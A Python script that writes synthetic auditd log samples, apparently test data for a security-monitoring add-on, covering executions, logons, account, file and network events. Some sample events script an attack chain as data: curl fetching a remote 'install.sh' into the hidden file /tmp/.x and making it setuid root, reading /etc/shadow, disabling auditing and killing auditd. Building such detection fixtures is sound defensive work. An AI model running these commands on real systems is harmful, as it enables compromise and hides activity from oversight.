#!/usr/bin/env python3
"""Generate SYNTHETIC Linux audit log samples for SOC-TA-auditd.

Every host, user, address and value below is made up. Addresses come from the
private 10.20.0.0/16 range and the documentation ranges 192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24 and 2001:db8::/32.

The records follow the formats written by auditd 3.x with log_format = ENRICHED:
raw key=value fields, then a 0x1D (group separator) and the interpreted fields
in upper case (UID="root", SYSCALL=execve, SADDR={ ... }). Records that belong
to one kernel event share the msg=audit(<epoch>.<ms>:<serial>) id.

Output (SOC-TA-auditd/samples/):
  audit.log              one file in the layout of /var/log/audit/audit.log
  audit_edge_cases.log   parsing edge cases: RAW log_format, syslog-forwarded
                         records, interleaved records of two events

Usage: python3 auditd/tools/generate_samples.py
"""

import calendar
import os

OUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "SOC-TA-auditd", "samples")
GS = "\x1d"
BASE = calendar.timegm((2026, 10, 24, 8, 0, 0))

NAMES = {0: "root", 33: "www-data", 104: "sshd", 1001: "alice", 1002: "bob", 1004: "olduser", 1010: "deploy",
         4294967295: "unset"}
GROUPS = {0: "root", 33: "www-data", 42: "shadow", 1001: "alice", 1002: "bob", 1004: "olduser", 1010: "deploy", 27: "sudo"}
ARCH = {"c000003e": "x86_64", "c00000b7": "aarch64"}
SYSCALLS = {  # x86_64 numbers (aarch64 numbers where an aarch64 host is used)
    "execve": 59, "connect": 42, "accept4": 288, "bind": 49, "openat": 257, "unlinkat": 263, "renameat2": 316,
    "fchmodat": 268, "fchownat": 260, "mkdir": 83, "setxattr": 188, "sendto": 44, "finit_module": 313,
    "setsockopt": 54, "kill": 62, "write": 1,
}


def hexs(s):
    return s.encode().hex().upper()


def enc(s):
    """auditd encoding of untrusted strings: quoted, or hex when it contains a quote, space, control or non-ASCII."""
    if any(c == '"' or ord(c) < 0x21 or ord(c) > 0x7e for c in s):
        return hexs(s)
    return '"%s"' % s


class Log:
    def __init__(self):
        self.lines = []
        self.serial = 48210
        self.t = 0.0

    def event(self, records, step=7.137, node=None, prefix=""):
        """records: list of (type, body). One msg=audit id for all of them."""
        self.t += step
        self.serial += 1
        stamp = "%.3f:%d" % (BASE + self.t, self.serial)
        for rtype, body in records:
            head = "node=%s " % node if node else ""
            self.lines.append("%s%stype=%s msg=audit(%s): %s" % (prefix, head, rtype, stamp, body))
        return stamp

    def write(self, name):
        os.makedirs(OUT_DIR, exist_ok=True)
        with open(os.path.join(OUT_DIR, name), "w", newline="\n") as f:
            f.write("\n".join(self.lines) + "\n")
        print("wrote %s (%d records)" % (name, len(self.lines)))


# ----------------------------------------------------------------- record builders

def ids_enriched(**ids):
    out = []
    for k, v in ids.items():
        table = GROUPS if k.endswith("GID") else NAMES
        out.append('%s="%s"' % (k.replace("_", "-"), table.get(v, "unknown(%d)" % v)))
    return " ".join(out)


def syscall(name, pid, ppid, uid, auid, comm, exe, key=None, success=True, exit_=0, args=("0", "0", "0", "0"),
            items=0, ses=None, tty="pts0", euid=None, gid=None, arch="c000003e", number=None, subj="unconfined",
            raw=False):
    euid = uid if euid is None else euid
    gid = uid if gid is None else gid
    ses = (4294967295 if auid == 4294967295 else 3) if ses is None else ses
    if auid == 4294967295:
        tty = "(none)"
    body = ("arch=%s syscall=%d success=%s exit=%s a0=%s a1=%s a2=%s a3=%s items=%d ppid=%d pid=%d auid=%d uid=%d "
            "gid=%d euid=%d suid=%d fsuid=%d egid=%d sgid=%d fsgid=%d tty=%s ses=%d comm=%s exe=%s subj=%s key=%s") % (
        arch, number if number is not None else SYSCALLS[name], "yes" if success else "no", exit_, args[0], args[1],
        args[2], args[3], items, ppid, pid, auid, uid, gid, euid, euid, euid, gid, gid, gid, tty, ses, enc(comm),
        enc(exe), subj, enc(key) if key else "(null)")
    if raw:
        return ("SYSCALL", body)
    return ("SYSCALL", body + GS + "ARCH=%s SYSCALL=%s %s" % (ARCH[arch], name, ids_enriched(
        AUID=auid, UID=uid, GID=gid, EUID=euid, SUID=euid, FSUID=euid, EGID=gid, SGID=gid, FSGID=gid)))


def execve(*argv):
    return ("EXECVE", "argc=%d " % len(argv) + " ".join("a%d=%s" % (i, enc(a)) for i, a in enumerate(argv)))


def cwd(path):
    return ("CWD", "cwd=%s" % enc(path))


def path(item, name, nametype, mode="0100644", ouid=0, ogid=0, inode=None):
    inode = inode or 1835000 + item * 17 + len(name)
    body = ("item=%d name=%s inode=%d dev=fd:00 mode=%s ouid=%d ogid=%d rdev=00:00 nametype=%s cap_fp=0 cap_fi=0 "
            "cap_fe=0 cap_fver=0 cap_frootid=0") % (item, enc(name) if name else "(null)", inode, mode, ouid, ogid,
                                                     nametype)
    return ("PATH", body + GS + ids_enriched(OUID=ouid, OGID=ogid))


def proctitle(*argv):
    joined = "\0".join(argv)
    if len(argv) == 1 and enc(joined).startswith('"'):
        return ("PROCTITLE", "proctitle=%s" % enc(joined))
    return ("PROCTITLE", "proctitle=%s" % hexs(joined)[:256])


def sockaddr_inet(ip, port):
    octets = "".join("%02X" % int(o) for o in ip.split("."))
    raw = "0200%04X%s0000000000000000" % (port, octets)
    return ("SOCKADDR", "saddr=%s" % raw + GS + "SADDR={ saddr_fam=inet laddr=%s lport=%d }" % (ip, port))


def sockaddr_inet6(ip_full, ip_text, port):
    raw = "0A00%04X00000000%s00000000" % (port, ip_full.replace(":", "").upper())
    return ("SOCKADDR", "saddr=%s" % raw + GS +
            "SADDR={ saddr_fam=inet6 laddr=%s lport=%d lflowinfo=0 lscope=0 }" % (ip_text, port))


def sockaddr_unix(p):
    return ("SOCKADDR", "saddr=0100%s" % hexs(p) + GS + "SADDR={ saddr_fam=local path=%s }" % p)


def user_msg(rtype, pid, uid, auid, msg, ses=None, extra_ids=None, subj="unconfined"):
    ses = (4294967295 if auid == 4294967295 else 3) if ses is None else ses
    body = "pid=%d uid=%d auid=%d ses=%d subj=%s msg='%s'" % (pid, uid, auid, ses, subj, msg)
    ids = dict(UID=uid, AUID=auid)
    ids.update(extra_ids or {})
    return (rtype, body + GS + ids_enriched(**ids))


def pam(op, acct, exe, res, grantors="pam_unix", hostname="?", addr="?", terminal="/dev/pts/0"):
    return 'op=%s grantors=%s acct=%s exe="%s" hostname=%s addr=%s terminal=%s res=%s' % (
        op, grantors if res == "success" else "?", enc(acct), exe, hostname, addr, terminal, res)


def acct_msg(op, exe, res="success", acct=None, id_=None, extra="", host="web-01", terminal="pts/0"):
    who = "acct=%s" % enc(acct) if acct is not None else "id=%d" % id_
    return 'op=%s %s%s exe="%s" hostname=%s addr=? terminal=%s res=%s' % (
        op, extra, who, exe, host, terminal, res)


# ----------------------------------------------------------------- main sample file

def main_log():
    L = Log()
    SSHD = "/usr/sbin/sshd"

    # --- Processes: execve with EXECVE / CWD / PATH / PROCTITLE -------------------------------
    L.event([syscall("execve", 24310, 24301, 0, 1001, "ls", "/usr/bin/ls", key="exec", items=2,
                     args=("55d1c3a0e2a0", "55d1c3a0e2c8", "55d1c3a0e2e0", "0")),
             execve("ls", "-la", "/tmp/my dir"),
             cwd("/root"),
             path(0, "/usr/bin/ls", "NORMAL", "0100755"),
             path(1, "/lib64/ld-linux-x86-64.so.2", "NORMAL", "0100755"),
             proctitle("ls", "-la", "/tmp/my dir")])
    L.event([syscall("execve", 24388, 1187, 33, 4294967295, "curl", "/usr/bin/curl", key="exec", items=2),
             execve("curl", "-s", "-o", "/tmp/.x", "http://198.51.100.20/install.sh"),
             cwd("/var/www"),
             path(0, "/usr/bin/curl", "NORMAL", "0100755"),
             path(1, "/lib64/ld-linux-x86-64.so.2", "NORMAL", "0100755"),
             proctitle("curl", "-s", "-o", "/tmp/.x", "http://198.51.100.20/install.sh")])
    L.event([syscall("execve", 24420, 812, 0, 4294967295, "logrotate", "/usr/sbin/logrotate", key="exec", items=2),
             execve("/usr/sbin/logrotate", "/etc/logrotate.conf"),
             cwd("/"),
             path(0, "/usr/sbin/logrotate", "NORMAL", "0100755"),
             path(1, "/lib64/ld-linux-x86-64.so.2", "NORMAL", "0100755"),
             proctitle("/usr/sbin/logrotate", "/etc/logrotate.conf")])
    # bob is not allowed to run the binary: EACCES
    L.event([syscall("execve", 24501, 24480, 1002, 1002, "bash", "/usr/bin/bash", key="exec", success=False,
                     exit_=-13, items=1),
             execve("/opt/tools/scan"),
             cwd("/home/bob"),
             path(0, "/opt/tools/scan", "NORMAL", "0100700"),
             proctitle("bash")])
    # very long argument: the kernel splits it into a1[0], a1[1] chunks
    long_arg = "A" * 40 + "B" * 40
    L.event([syscall("execve", 24533, 24301, 1001, 1001, "python3", "/usr/bin/python3.12", key="exec", items=2),
             ("EXECVE", 'argc=3 a0="python3" a1_len=80 a1[0]="%s" a1[1]="%s" a2="--verbose"' % (
                 long_arg[:40], long_arg[40:])),
             cwd("/home/alice"),
             path(0, "/usr/bin/python3", "NORMAL", "0100755"),
             path(1, "/lib64/ld-linux-x86-64.so.2", "NORMAL", "0100755"),
             proctitle("python3", long_arg, "--verbose")])
    # aarch64 host (db-01) with name_format = hostname, so every record starts with node=
    L.event([syscall("execve", 7120, 7101, 0, 1001, "id", "/usr/bin/id", key="exec", items=2, arch="c00000b7",
                     number=221),
             execve("id", "deploy"),
             cwd("/root"),
             path(0, "/usr/bin/id", "NORMAL", "0100755"),
             path(1, "/lib/ld-linux-aarch64.so.1", "NORMAL", "0100755"),
             proctitle("id", "deploy")], node="db-01")
    # sudo command log
    L.event([user_msg("USER_CMD", 24301, 1001, 1001,
                      'cwd="/home/alice" cmd=%s exe="/usr/bin/sudo" terminal=pts/0 res=success'
                      % hexs("systemctl restart nginx"))])

    # --- Endpoint.Ports: bind ---------------------------------------------------------------------
    L.event([syscall("bind", 25010, 24301, 1001, 1001, "python3", "/usr/bin/python3.12", key="net_bind",
                     args=("3", "7ffd5b1c2a40", "10", "0")),
             sockaddr_inet("0.0.0.0", 8080),
             proctitle("python3", "-m", "http.server", "8080")])
    L.event([syscall("bind", 1450, 1, 0, 4294967295, "nginx", "/usr/sbin/nginx", key="net_bind",
                     args=("6", "55e0a1b2c3d0", "1c", "0")),
             sockaddr_inet6("0000:0000:0000:0000:0000:0000:0000:0000", "::", 443),
             proctitle("nginx: master process /usr/sbin/nginx")])
    # ephemeral bind (port 0) and a Unix socket: not Endpoint.Ports
    L.event([syscall("bind", 25022, 24301, 1001, 1001, "python3", "/usr/bin/python3.12", key="net_bind",
                     args=("3", "7ffd5b1c2a40", "10", "0")),
             sockaddr_inet("0.0.0.0", 0),
             proctitle("python3", "client.py")])
    L.event([syscall("bind", 640, 1, 0, 4294967295, "systemd-journal", "/usr/lib/systemd/systemd-journald",
                     key="net_bind", args=("3", "7ffd5b1c2a40", "6e", "0")),
             sockaddr_unix("/run/systemd/journal/socket"),
             proctitle("/usr/lib/systemd/systemd-journald")])

    # --- Endpoint.Services --------------------------------------------------------------------
    for unit, rtype, res in (("nginx", "SERVICE_STOP", "success"), ("nginx", "SERVICE_START", "success"),
                             ("postgresql", "SERVICE_START", "failed")):
        L.event([user_msg(rtype, 1, 0, 4294967295, 'unit=%s comm="systemd" exe="/usr/lib/systemd/systemd" '
                          'hostname=? addr=? terminal=? res=%s' % (unit, res))])

    # --- Endpoint.Filesystem: watched paths --------------------------------------------------
    # read /etc/shadow (O_RDONLY)
    L.event([syscall("openat", 25101, 24301, 0, 1001, "cat", "/usr/bin/cat", key="identity", exit_=3, items=1,
                     args=("ffffff9c", "7ffc8e0a4f10", "0", "0")),
             cwd("/root"),
             path(0, "/etc/shadow", "NORMAL", "0100640", 0, 42),
             proctitle("cat", "/etc/shadow")])
    # bob fails to read it
    L.event([syscall("openat", 25130, 24480, 1002, 1002, "cat", "/usr/bin/cat", key="identity", success=False,
                     exit_=-13, items=1, args=("ffffff9c", "7ffc8e0a4f10", "0", "0")),
             cwd("/home/bob"),
             path(0, "/etc/shadow", "NORMAL", "0100640", 0, 42),
             proctitle("cat", "/etc/shadow")])
    # relative name: cat shadow from /etc
    L.event([syscall("openat", 25140, 24301, 0, 1001, "less", "/usr/bin/less", key="identity", exit_=4, items=1,
                     args=("ffffff9c", "55a0c0d0e0f0", "0", "0")),
             cwd("/etc"),
             path(0, "shadow", "NORMAL", "0100640", 0, 42),
             proctitle("less", "shadow")])
    # create a file with a space in its name (O_WRONLY|O_CREAT|O_TRUNC = 0x241)
    L.event([syscall("openat", 25160, 24301, 1001, 1001, "touch", "/usr/bin/touch", key="tmp_exec", exit_=3,
                     items=2, args=("ffffff9c", "7ffd1b2c3d40", "941", "1b6")),
             cwd("/home/alice"),
             path(0, "/tmp/", "PARENT", "041777", 0, 0),
             path(1, "/tmp/a b.txt", "CREATE", "0100664", 1001, 1001),
             proctitle("touch", "/tmp/a b.txt")])
    # append to /etc/passwd (O_WRONLY|O_APPEND = 0x401)
    L.event([syscall("openat", 25170, 24301, 0, 1001, "bash", "/usr/bin/bash", key="identity", exit_=3, items=1,
                     args=("ffffff9c", "5612a0b0c0d0", "401", "1b6")),
             cwd("/root"),
             path(0, "/etc/passwd", "NORMAL", "0100644"),
             proctitle("-bash")])
    # delete a sudoers drop-in
    L.event([syscall("unlinkat", 25190, 24301, 0, 1001, "rm", "/usr/bin/rm", key="sudoers", items=2,
                     args=("ffffff9c", "5581f0e0d0c0", "0", "0")),
             cwd("/root"),
             path(0, "/etc/sudoers.d/", "PARENT", "040750"),
             path(1, "/etc/sudoers.d/90-temp", "DELETE", "0100440"),
             proctitle("rm", "-f", "/etc/sudoers.d/90-temp")])
    # rename over /etc/passwd (vipw style)
    L.event([syscall("renameat2", 25210, 25201, 0, 1001, "vipw", "/usr/sbin/vipw", key="identity", items=4,
                     args=("ffffff9c", "7ffe0a1b2c30", "ffffff9c", "7ffe0a1b2c60")),
             cwd("/root"),
             path(0, "/etc/", "PARENT", "040755"),
             path(1, "/etc/", "PARENT", "040755"),
             path(2, "/etc/passwd", "DELETE", "0100644"),
             path(3, "/etc/passwd", "CREATE", "0100644"),
             proctitle("vipw")])
    # chmod u+s and chown root
    L.event([syscall("fchmodat", 25230, 24301, 0, 1001, "chmod", "/usr/bin/chmod", key="perm_mod", items=1,
                     args=("ffffff9c", "55c0d0e0f010", "9ed", "0")),
             cwd("/tmp"),
             path(0, "/tmp/.x", "NORMAL", "0100755", 33, 33),
             proctitle("chmod", "4755", "/tmp/.x")])
    L.event([syscall("fchownat", 25240, 24301, 0, 1001, "chown", "/usr/bin/chown", key="perm_mod", items=1,
                     args=("ffffff9c", "55c0d0e0f010", "0", "0")),
             cwd("/tmp"),
             path(0, "/tmp/.x", "NORMAL", "0104755", 33, 33),
             proctitle("chown", "root:root", "/tmp/.x")])
    L.event([syscall("setxattr", 25250, 24301, 0, 1001, "setcap", "/usr/sbin/setcap", key="perm_mod", items=1,
                     args=("7ffd2a3b4c50", "7f1a2b3c4d00", "55d0e0f0a0b0", "18")),
             cwd("/root"),
             path(0, "/usr/local/bin/tool", "NORMAL", "0100755"),
             proctitle("setcap", "cap_net_raw+ep", "/usr/local/bin/tool")])
    L.event([syscall("mkdir", 25260, 24301, 0, 1001, "mkdir", "/usr/bin/mkdir", key="cron", items=2,
                     args=("7ffd9e8a7b60", "1ed", "0", "0")),
             cwd("/root"),
             path(0, "/etc/cron.d/", "PARENT", "040755"),
             path(1, "/etc/cron.d/backup", "CREATE", "040755"),
             proctitle("mkdir", "/etc/cron.d/backup")])

    # --- Authentication ------------------------------------------------------------------------
    # successful SSH password logon: USER_AUTH + USER_ACCT + CRED_ACQ + LOGIN + USER_START + USER_LOGIN
    L.event([user_msg("USER_AUTH", 24290, 0, 4294967295, pam("PAM:authentication", "alice", SSHD, "success",
                                                             hostname="203.0.113.50", addr="203.0.113.50",
                                                             terminal="ssh"))])
    L.event([user_msg("USER_ACCT", 24290, 0, 4294967295, pam("PAM:accounting", "alice", SSHD, "success",
                                                             grantors="pam_permit", hostname="203.0.113.50",
                                                             addr="203.0.113.50", terminal="ssh"))], step=0.004)
    L.event([user_msg("CRED_ACQ", 24290, 0, 4294967295, pam("PAM:setcred", "alice", SSHD, "success",
                                                            grantors="pam_env,pam_unix", hostname="203.0.113.50",
                                                            addr="203.0.113.50", terminal="ssh"))], step=0.004)
    # pam_loginuid writes /proc/self/loginuid: the kernel LOGIN record comes with the write() SYSCALL
    L.event([("LOGIN", "pid=24290 uid=0 subj=unconfined old-auid=4294967295 auid=1001 tty=(none) "
              "old-ses=4294967295 ses=3 res=1" + GS + ids_enriched(UID=0, OLD_AUID=4294967295, AUID=1001)),
             syscall("write", 24290, 1188, 0, 1001, "sshd", SSHD, exit_=4, tty="(none)",
                     args=("3", "7ffd2c3b4a50", "4", "0")),
             proctitle("sshd: alice [priv]")], step=0.004)
    L.event([user_msg("USER_START", 24290, 0, 1001, pam("PAM:session_open", "alice", SSHD, "success",
                                                        grantors="pam_selinux,pam_loginuid,pam_unix",
                                                        hostname="203.0.113.50", addr="203.0.113.50",
                                                        terminal="ssh"))], step=0.01)
    L.event([user_msg("USER_LOGIN", 24301, 0, 1001, 'op=login id=1001 exe="%s" hostname=? addr=203.0.113.50 '
                      'terminal=/dev/pts/1 res=success' % SSHD, extra_ids={"ID": 1001})], step=0.03)
    # SSH brute force: wrong password (USER_AUTH failed) and an invalid user (USER_LOGIN failed)
    L.event([user_msg("USER_AUTH", 24350, 0, 4294967295, pam("PAM:authentication", "alice", SSHD, "failed",
                                                             hostname="203.0.113.77", addr="203.0.113.77",
                                                             terminal="ssh"))])
    L.event([user_msg("USER_LOGIN", 24350, 0, 4294967295, 'op=login acct="alice" exe="%s" hostname=? '
                      'addr=203.0.113.77 terminal=ssh res=failed' % SSHD)], step=0.2)
    L.event([user_msg("USER_LOGIN", 24361, 0, 4294967295, 'op=login acct="admin" exe="%s" hostname=? '
                      'addr=203.0.113.77 terminal=ssh res=failed' % SSHD)], step=1.5)
    # console logon on tty1
    L.event([user_msg("USER_LOGIN", 980, 0, 1002, 'op=login id=1002 exe="/usr/bin/login" hostname=web-01 '
                      'addr=? terminal=tty1 res=success', extra_ids={"ID": 1002})])
    # FTP logon (another PAM application)
    L.event([user_msg("USER_AUTH", 3310, 0, 4294967295, pam("PAM:authentication", "bob", "/usr/sbin/vsftpd",
                                                            "success", hostname="198.51.100.45",
                                                            addr="198.51.100.45", terminal="ftp"))])
    # privilege escalation: sudo (success) and su (failure)
    L.event([user_msg("USER_AUTH", 24305, 1001, 1001, pam("PAM:authentication", "alice", "/usr/bin/sudo",
                                                          "success"))])
    L.event([user_msg("USER_ACCT", 24305, 1001, 1001, pam("PAM:accounting", "alice", "/usr/bin/sudo", "success",
                                                          grantors="pam_permit"))], step=0.002)
    L.event([user_msg("USER_START", 24305, 1001, 1001, pam("PAM:session_open", "root", "/usr/bin/sudo",
                                                           "success", grantors="pam_limits,pam_unix"))], step=0.002)
    L.event([user_msg("USER_AUTH", 24490, 1002, 1002, pam("PAM:authentication", "root", "/usr/bin/su",
                                                          "failed"))])
    # logout
    L.event([user_msg("USER_END", 24290, 0, 1001, pam("PAM:session_close", "alice", SSHD, "success",
                                                      grantors="pam_selinux,pam_loginuid,pam_unix",
                                                      hostname="203.0.113.50", addr="203.0.113.50",
                                                      terminal="ssh"))])
    L.event([user_msg("USER_LOGOUT", 24301, 0, 1001, 'op=logout id=1001 exe="%s" hostname=? '
                      'addr=203.0.113.50 terminal=/dev/pts/1 res=success' % SSHD, extra_ids={"ID": 1001})],
            step=0.01)
    L.event([user_msg("CRED_DISP", 24290, 0, 1001, pam("PAM:setcred", "alice", SSHD, "success",
                                                       grantors="pam_env,pam_unix", hostname="203.0.113.50",
                                                       addr="203.0.113.50", terminal="ssh"))], step=0.01)

    # --- Change.Account_Management -------------------------------------------------------------
    L.event([user_msg("ADD_GROUP", 26010, 0, 1001, acct_msg("add-group", "/usr/sbin/useradd", id_=1010),
                      extra_ids={"ID": 1010})])
    L.event([user_msg("ADD_USER", 26010, 0, 1001, acct_msg("add-user", "/usr/sbin/useradd", acct="deploy"))],
            step=0.01)
    L.event([user_msg("USER_MGMT", 26040, 0, 1001, acct_msg("add-user-to-group", "/usr/sbin/usermod",
                                                            acct="deploy", extra='grp="sudo" '))])
    L.event([user_msg("USER_CHAUTHTOK", 26060, 0, 1001, pam("PAM:chauthtok", "deploy", "/usr/bin/passwd",
                                                            "success", grantors="pam_pwquality,pam_unix",
                                                            terminal="pts/0"))])
    L.event([user_msg("ACCT_LOCK", 26080, 0, 1001, acct_msg("locked-password", "/usr/sbin/usermod", id_=1004),
                      extra_ids={"ID": 1004})])
    L.event([user_msg("DEL_USER", 26100, 0, 1001, acct_msg("delete-user", "/usr/sbin/userdel", acct="olduser"))])
    L.event([user_msg("DEL_GROUP", 26100, 0, 1001, acct_msg("delete-group", "/usr/sbin/userdel", acct="olduser"))],
            step=0.01)
    # pam_faillock: too many failed logons for bob
    L.event([user_msg("ANOM_LOGIN_FAILURES", 24370, 0, 4294967295, 'op=pam_faillock suid=1002 exe="%s" '
                      'hostname=? addr=? terminal=? res=success' % SSHD, extra_ids={"SUID": 1002})])

    # --- Change.Auditing_Changes: rule changes come with the auditctl SYSCALL -------------------
    L.event([("CONFIG_CHANGE", "auid=1001 ses=3 subj=unconfined op=remove_rule key=\"identity\" list=4 res=1"
              + GS + ids_enriched(AUID=1001)),
             syscall("sendto", 26200, 24301, 0, 1001, "auditctl", "/usr/sbin/auditctl", exit_=1072,
                     args=("4", "7ffc6a5b4c30", "430", "0")),
             sockaddr_unix("netlink"),
             proctitle("auditctl", "-W", "/etc/shadow", "-p", "rwa", "-k", "identity")])
    L.event([("CONFIG_CHANGE", "op=set audit_enabled=0 old=1 auid=1001 ses=3 subj=unconfined res=1"
              + GS + ids_enriched(AUID=1001)),
             syscall("sendto", 26210, 24301, 0, 1001, "auditctl", "/usr/sbin/auditctl", exit_=60,
                     args=("4", "7ffc6a5b4c30", "3c", "0")),
             proctitle("auditctl", "-e", "0")])
    L.event([("DAEMON_END", "op=terminate auid=0 uid=0 ses=4294967295 subj=unconfined pid=1 res=success"
              + GS + ids_enriched(AUID=0, UID=0))])
    L.event([("DAEMON_START", "op=start ver=3.1.2 format=enriched kernel=6.8.0-47-generic auid=4294967295 pid=812 "
              "uid=0 ses=4294967295 subj=unconfined res=success" + GS + ids_enriched(AUID=4294967295, UID=0))])
    L.event([("DAEMON_ABORT", "op=error-halt auid=4294967295 pid=812 uid=0 ses=4294967295 subj=unconfined "
              "res=failed" + GS + ids_enriched(AUID=4294967295, UID=0))], node="db-01")

    # --- Change.Endpoint_Changes: rpm/dnf and boot/shutdown ------------------------------------
    for op, sw in (("install", "nginx-1:1.20.1-16.el9.aarch64"), ("update", "openssl-1:3.2.2-6.el9.aarch64"),
                   ("remove", "telnet-1:0.17-85.el9.aarch64")):
        L.event([user_msg("SOFTWARE_UPDATE", 7400, 0, 1001, 'op=%s sw="%s" sw_type=rpm key_enforce=0 gpg_res=1 '
                          'root_dir="/" comm="dnf" exe="/usr/bin/python3.9" hostname=db-01 addr=? terminal=pts/0 '
                          'res=success' % (op, sw))], node="db-01")
    L.event([user_msg("SYSTEM_SHUTDOWN", 1, 0, 4294967295, ' comm="systemd-update-utmp" '
                      'exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success')],
            node="db-01")
    L.event([user_msg("SYSTEM_BOOT", 640, 0, 4294967295, ' comm="systemd-update-utmp" '
                      'exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success')],
            node="db-01", step=95.0)

    # --- Network_Traffic: connect / accept ---------------------------------------------------
    # non-blocking connect returns EINPROGRESS (-115) although the connection proceeds
    L.event([syscall("connect", 24388, 1187, 33, 4294967295, "curl", "/usr/bin/curl", key="net_connect",
                     success=False, exit_=-115, args=("5", "7ffe4b3c2d10", "10", "0")),
             sockaddr_inet("198.51.100.20", 80),
             proctitle("curl", "-s", "-o", "/tmp/.x", "http://198.51.100.20/install.sh")])
    L.event([syscall("connect", 25310, 24301, 1001, 1001, "ssh", "/usr/bin/ssh", key="net_connect", exit_=0,
                     args=("3", "55f0a1b2c3d4", "1c", "0")),
             sockaddr_inet6("2001:0db8:0000:0000:0000:0000:0020:0021", "2001:db8::20:21", 22),
             proctitle("ssh", "backup@2001:db8::20:21")])
    L.event([syscall("connect", 25320, 24301, 1001, 1001, "nc", "/usr/bin/nc.openbsd", key="net_connect",
                     success=False, exit_=-111, args=("3", "7ffd3c4b5a60", "10", "0")),
             sockaddr_inet("10.20.2.21", 5432),
             proctitle("nc", "-zv", "10.20.2.21", "5432")])
    L.event([syscall("accept4", 1188, 1, 0, 4294967295, "sshd", SSHD, key="net_accept", exit_=5,
                     args=("3", "7ffd5e6f7a80", "7ffd5e6f7a7c", "80800")),
             sockaddr_inet("203.0.113.50", 51514),
             proctitle("sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups")])
    # local Unix socket connection: not Network_Traffic
    L.event([syscall("connect", 25330, 24301, 1001, 1001, "systemctl", "/usr/bin/systemctl", key="net_connect",
                     args=("3", "7ffd8a9b0c10", "6e", "0")),
             sockaddr_unix("/run/systemd/private"),
             proctitle("systemctl", "status", "nginx")])

    # --- Other record types (searchable through untagged eventtypes) -------------------------
    L.event([("AVC", 'apparmor="DENIED" operation="open" class="file" profile="/usr/sbin/nginx" name="/etc/shadow" '
              'pid=1451 comm="nginx" requested_mask="r" denied_mask="r" fsuid=33 ouid=0' + GS +
              ids_enriched(FSUID=33, OUID=0)),
             syscall("openat", 1451, 1450, 33, 4294967295, "nginx", "/usr/sbin/nginx", success=False, exit_=-13,
                     items=1, args=("ffffff9c", "55e0a1b2c3e0", "80000", "0")),
             path(0, "/etc/shadow", "NORMAL", "0100640", 0, 42),
             proctitle("nginx: worker process")])
    L.event([("ANOM_ABEND", "auid=1001 uid=1001 gid=1001 ses=3 subj=unconfined pid=25400 comm=\"python3\" "
              "exe=\"/usr/bin/python3.12\" sig=11 res=1" + GS + ids_enriched(AUID=1001, UID=1001, GID=1001))])
    L.event([("ANOM_PROMISCUOUS", "dev=eth0 prom=256 old_prom=0 auid=1001 uid=0 gid=0 ses=3" + GS +
              ids_enriched(AUID=1001, UID=0, GID=0)),
             syscall("setsockopt", 25410, 24301, 0, 1001, "tcpdump", "/usr/bin/tcpdump",
                     args=("3", "107", "1", "7ffd0c1d2e30")),
             proctitle("tcpdump", "-i", "eth0", "-w", "/tmp/cap.pcap")])
    L.event([syscall("finit_module", 25420, 24301, 0, 1001, "modprobe", "/usr/bin/kmod", key="modules",
                     args=("3", "55a0b1c2d3e4", "0", "0")),
             ("KERN_MODULE", 'name="nf_tables"'),
             proctitle("modprobe", "nf_tables")])
    L.event([syscall("kill", 25430, 24301, 0, 1001, "kill", "/usr/bin/kill", key="kill",
                     args=("5a6", "9", "0", "0")),
             ("OBJ_PID", "opid=1446 oauid=4294967295 ouid=0 oses=4294967295 obj=unconfined ocomm=\"auditd\"" + GS +
              ids_enriched(OAUID=4294967295, OUID=0)),
             proctitle("kill", "-9", "1446")])
    L.write("audit.log")


# ----------------------------------------------------------------- edge cases

def edge_log():
    L = Log()
    L.t = 3600.0
    # log_format = RAW: no 0x1D section. Parsed and grouped, but not CIM-tagged (needs ENRICHED names).
    L.event([syscall("execve", 31010, 31001, 0, 1001, "uname", "/usr/bin/uname", key="exec", items=2, raw=True),
             execve("uname", "-a"),
             ("CWD", 'cwd="/root"'),
             ("PATH", "item=0 name=\"/usr/bin/uname\" inode=1835200 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 "
                      "nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0"),
             ("PROCTITLE", "proctitle=756E616D65002D61")])
    # forwarded through syslog (rsyslog imfile / audisp-syslog): a syslog header before each record
    L.event([user_msg("USER_LOGIN", 31100, 0, 4294967295, 'op=login acct="oracle" exe="/usr/sbin/sshd" '
                      'hostname=? addr=192.0.2.66 terminal=ssh res=failed')],
            prefix="Oct 24 09:01:30 web-01 audisp-syslog: ")
    # records of two kernel events interleaved: grouped by id, never mixed
    a_t, b_t = "%.3f" % (BASE + 3700.0), "%.3f" % (BASE + 3700.001)
    a_id, b_id = "%s:%d" % (a_t, 50001), "%s:%d" % (b_t, 50002)
    a = [syscall("openat", 31200, 31001, 0, 1001, "cat", "/usr/bin/cat", key="identity", exit_=3, items=1,
                 args=("ffffff9c", "7ffc8e0a4f10", "0", "0")),
         cwd("/root"), path(0, "/etc/gshadow", "NORMAL", "0100640", 0, 42), proctitle("cat", "/etc/gshadow")]
    b = [syscall("execve", 31210, 31002, 1002, 1002, "id", "/usr/bin/id", key="exec", items=2),
         execve("id"), cwd("/home/bob"), path(0, "/usr/bin/id", "NORMAL", "0100755"),
         path(1, "/lib64/ld-linux-x86-64.so.2", "NORMAL", "0100755"), proctitle("id")]
    order = [(a_id, a[0]), (b_id, b[0]), (a_id, a[1]), (a_id, a[2]), (b_id, b[1]), (b_id, b[2]), (a_id, a[3]),
             (b_id, b[3]), (b_id, b[4]), (b_id, b[5])]
    for stamp, (rtype, body) in order:
        L.lines.append("type=%s msg=audit(%s): %s" % (rtype, stamp, body))
    L.write("audit_edge_cases.log")


if __name__ == "__main__":
    main_log()
    edge_log()
